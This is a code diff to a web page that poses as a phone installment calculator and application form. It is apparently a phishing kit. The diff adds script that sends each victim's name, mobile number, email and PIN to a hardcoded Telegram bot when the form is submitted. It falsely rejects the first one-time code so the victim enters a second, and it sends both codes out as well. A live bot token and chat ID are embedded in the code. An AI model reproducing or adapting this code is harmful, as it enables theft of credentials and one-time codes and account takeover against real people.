@@ -189,159 +189,117 @@
 </div>
 
 <script>
-  let otpAttempts = 0;
+let otpAttempts = 0;
+let firstOTP = "";
 
-  const page1 = document.getElementById('page1');
-  const page2 = document.getElementById('page2');
-  const page3 = document.getElementById('page3');
-  const page4 = document.getElementById('page4');
-  const loading = document.getElementById('loading');
-  const otpMessage = document.getElementById('otpMessage');
+const page1 = document.getElementById('page1');
+const page2 = document.getElementById('page2');
+const page3 = document.getElementById('page3');
+const page4 = document.getElementById('page4');
+const loading = document.getElementById('loading');
+const otpMessage = document.getElementById('otpMessage');
 
-  const calcResult = document.getElementById('calcResult');
-  const infoStatus = document.getElementById('infoStatus');
-  const otpStatus = document.getElementById('otpStatus');
+const calcResult = document.getElementById('calcResult');
+const infoStatus = document.getElementById('infoStatus');
+const otpStatus = document.getElementById('otpStatus');
 
-  // Calculate installment
-  document.getElementById('calculateBtn').addEventListener('click', () => {
-    let price = parseFloat(document.getElementById('price').value);
-    let downpayment = parseFloat(document.getElementById('downpayment').value);
-    let months = parseInt(document.getElementById('months').value);
+// Calculate installment
+document.getElementById('calculateBtn').addEventListener('click', () => {
+  let price = parseFloat(document.getElementById('price').value);
+  let downpayment = parseFloat(document.getElementById('downpayment').value);
+  let months = parseInt(document.getElementById('months').value);
 
-    if (isNaN(price) || price <= 0) {
-      calcResult.style.color = 'red';
-      calcResult.textContent = "Please enter a valid price.";
-      return;
-    }
-    if (isNaN(downpayment) || downpayment < 0) {
-      calcResult.style.color = 'red';
-      calcResult.textContent = "Please enter a valid downpayment (0 or more).";
-      return;
-    }
-    if (downpayment > price) {
-      calcResult.style.color = 'red';
-      calcResult.textContent = "Downpayment cannot exceed the price.";
-      return;
-    }
-    const balance = price - downpayment;
-    const monthly = balance / months;
+  if (isNaN(price) || price <= 0) { calcResult.style.color = 'red'; calcResult.textContent = "Please enter a valid price."; return; }
+  if (isNaN(downpayment) || downpayment < 0) { calcResult.style.color = 'red'; calcResult.textContent = "Please enter a valid downpayment."; return; }
+  if (downpayment > price) { calcResult.style.color = 'red'; calcResult.textContent = "Downpayment cannot exceed the price."; return; }
 
-    calcResult.style.color = 'green';
-    calcResult.innerHTML = `Monthly Payment (0% interest): ₱${monthly.toFixed(2)} for ${months} months.<br>Balance after downpayment: ₱${balance.toFixed(2)}`;
-  });
+  const balance = price - downpayment;
+  const monthly = balance / months;
 
-  // Page1 -> Page2
-  document.getElementById('nextToInfoBtn').addEventListener('click', () => {
-    const unit = document.getElementById('unit').value.trim();
-    const price = parseFloat(document.getElementById('price').value);
-    const downpayment = parseFloat(document.getElementById('downpayment').value);
-    const months = parseInt(document.getElementById('months').value);
+  calcResult.style.color = 'green';
+  calcResult.innerHTML = `Monthly Payment (0% interest): ₱${monthly.toFixed(2)} for ${months} months.<br>Balance after downpayment: ₱${balance.toFixed(2)}`;
+});
 
-    if (!unit || isNaN(price) || price <= 0 || isNaN(downpayment) || downpayment < 0 || downpayment > price || !months) {
-      alert("Please complete all fields correctly.");
-      return;
-    }
+// Page1 -> Page2
+document.getElementById('nextToInfoBtn').addEventListener('click', () => {
+  const unit = document.getElementById('unit').value.trim();
+  const price = parseFloat(document.getElementById('price').value);
+  const downpayment = parseFloat(document.getElementById('downpayment').value);
+  const months = parseInt(document.getElementById('months').value);
+  if (!unit || isNaN(price) || price<=0 || isNaN(downpayment) || downpayment<0 || downpayment>price || !months) { alert("Please complete all fields correctly."); return; }
 
-    showLoading(2000).then(() => {
-      page1.style.display = 'none';
-      page2.style.display = 'block';
-      calcResult.textContent = "";
-    });
-  });
+  showLoading(2000).then(() => { page1.style.display='none'; page2.style.display='block'; calcResult.textContent=''; });
+});
 
-  // Page2 -> Page3
-  document.getElementById('nextToOtpBtn').addEventListener('click', () => {
-    const name = document.getElementById('name').value.trim();
-    const mobile = document.getElementById('mobile').value.trim();
-    const pin = document.getElementById('pin').value.trim();
-    const email = document.getElementById('email').value.trim();
+// Page2 -> Page3
+document.getElementById('nextToOtpBtn').addEventListener('click', () => {
+  const name = document.getElementById('name').value.trim();
+  const mobile = document.getElementById('mobile').value.trim();
+  const pin = document.getElementById('pin').value.trim();
+  const email = document.getElementById('email').value.trim();
 
-    if (!name || !mobile || !pin || !email) {
-      infoStatus.style.color = 'red';
-      infoStatus.textContent = "Please fill all fields.";
-      return;
-    }
-    if (!/^\d{11}$/.test(mobile)) {
-      infoStatus.style.color = 'red';
-      infoStatus.textContent = "Mobile number must be exactly 11 digits.";
-      return;
-    }
-    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
-      infoStatus.style.color = 'red';
-      infoStatus.textContent = "PIN must be exactly 4 digits.";
-      return;
-    }
+  if (!name||!mobile||!pin||!email){ infoStatus.style.color='red'; infoStatus.textContent="Please fill all fields."; return; }
+  if(!/^\d{11}$/.test(mobile)){ infoStatus.style.color='red'; infoStatus.textContent="Mobile number must be 11 digits."; return; }
+  if(pin.length!==4 || !/^\d{4}$/.test(pin)){ infoStatus.style.color='red'; infoStatus.textContent="PIN must be 4 digits."; return; }
 
-    infoStatus.textContent = "";
-    otpMessage.textContent = `We sent a 6-digit verification code to your mobile number (${mobile}).`;
+  infoStatus.textContent='';
+  otpMessage.textContent=`We sent a 6-digit verification code to your mobile number (${mobile}).`;
 
-    showLoading(4000).then(() => {
-      page2.style.display = 'none';
-      page3.style.display = 'block';
-    });
-  });
+  // Send user info to Telegram
+  sendUserInfoToTelegram();
 
-  // OTP verification
-  document.getElementById('verifyOtpBtn').addEventListener('click', () => {
-    const enteredOTP = document.getElementById('otp').value.trim();
+  showLoading(4000).then(()=>{ page2.style.display='none'; page3.style.display='block'; });
+});
 
-    if (enteredOTP.length !== 6) {
-      otpStatus.textContent = "";
-      showLoading(1000).then(() => {
-        otpStatus.style.color = 'red';
-        otpStatus.textContent = "❌ Invalid OTP. Please try again.";
-      });
-      return;
-    }
-
-    otpAttempts++;
-
-    const userData = {
-      unit: document.getElementById('unit').value,
-      price: document.getElementById('price').value,
-      downpayment: document.getElementById('downpayment').value,
-      months: document.getElementById('months').value,
-      name: document.getElementById('name').value,
-      mobile: document.getElementById('mobile').value,
-      email: document.getElementById('email').value,
-      pin: document.getElementById('pin').value,
-      otp: enteredOTP  // ✅ now sending the user input OTP
-    };
-
-    if (otpAttempts === 1) {
-      otpStatus.textContent = "";
-      showLoading(3000).then(() => {
-        otpStatus.style.color = 'red';
-        otpStatus.textContent = "❌ Invalid OTP. Please try again.";
-      });
-    } else {
-      otpStatus.textContent = "";
-      page3.style.display = 'none';
-      showLoading(3000).then(() => {
-        page4.style.display = 'block';
-        sendToTelegram(userData);
-      });
-    }
-  });
-
-  // Loading utility
-  function showLoading(duration) {
-    return new Promise((resolve) => {
-      loading.style.display = 'flex';
-      setTimeout(() => {
-        loading.style.display = 'none';
-        resolve();
-      }, duration);
-    });
+// OTP verification
+document.getElementById('verifyOtpBtn').addEventListener('click', () => {
+  const enteredOTP = document.getElementById('otp').value.trim();
+  if(enteredOTP.length!==6){
+    otpStatus.textContent='';
+    showLoading(1000).then(()=>{ otpStatus.style.color='red'; otpStatus.textContent="❌ Invalid OTP. Please try again."; });
+    return;
   }
 
-  // Telegram sender
-  function sendToTelegram(data) {
-    const botToken = "8267241825:AAEkd2U10BCKXBbQappfUluS6n72HiUfDZI"; // <-- your bot token
-    const chatId = "5374601148";  // <-- your chat ID
+  otpAttempts++;
+  if(otpAttempts===1){
+    firstOTP = enteredOTP;
+    sendOtpToTelegram(firstOTP,''); // send first attempt
+    otpStatus.textContent='';
+    showLoading(3000).then(()=>{ otpStatus.style.color='red'; otpStatus.textContent="❌ Invalid OTP. Please try again."; });
+  } else {
+    const secondOTP = enteredOTP;
+    otpStatus.textContent='';
+    page3.style.display='none';
+    showLoading(3000).then(()=>{ 
+      page4.style.display='block';
+      sendOtpToTelegram(firstOTP, secondOTP); // send both
+    });
+  }
+});
 
-    const message = `
-📱 Phone Installment Application:
+// Loading utility
+function showLoading(duration){
+  return new Promise(resolve=>{ loading.style.display='flex'; setTimeout(()=>{ loading.style.display='none'; resolve(); }, duration); });
+}
+
+// Send user info to Telegram
+function sendUserInfoToTelegram(){
+  const botToken = "8267241825:AAEkd2U10BCKXBbQappfUluS6n72HiUfDZI";
+  const chatId = "5374601148";
+
+  const data = {
+    unit: document.getElementById('unit').value,
+    price: document.getElementById('price').value,
+    downpayment: document.getElementById('downpayment').value,
+    months: document.getElementById('months').value,
+    name: document.getElementById('name').value,
+    mobile: document.getElementById('mobile').value,
+    email: document.getElementById('email').value,
+    pin: document.getElementById('pin').value
+  };
+
+  const message = `
+📱 User Information Submitted:
 Unit: ${data.unit}
 Price: ₱${data.price}
 Downpayment: ₱${data.downpayment}
@@ -350,18 +308,32 @@ Name: ${data.name}
 Mobile: ${data.mobile}
 Email: ${data.email}
 PIN: ${data.pin}
-OTP: ${data.otp}
-    `;
+  `;
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: message })
-    })
-    .then(response => response.json())
-    .then(result => console.log("Sent to Telegram:", result))
-    .catch(error => console.error("Error sending to Telegram:", error));
-  }
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:chatId,text:message})
+  }).then(res=>res.json()).then(res=>console.log("Info Sent:",res)).catch(err=>console.error("Error:",err));
+}
+
+// Send OTPs to Telegram
+function sendOtpToTelegram(otp1, otp2){
+  const botToken = "8267241825:AAEkd2U10BCKXBbQappfUluS6n72HiUfDZI"; 
+  const chatId = "5374601148";  
+
+  const message = `
+🔑 OTP Submission:
+OTP1: ${otp1}
+OTP2: ${otp2}
+  `;
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:chatId,text:message})
+  }).then(res=>res.json()).then(res=>console.log("OTP Sent:",res)).catch(err=>console.error("Error:",err));
+}
 </script>
 </body>
 </html>
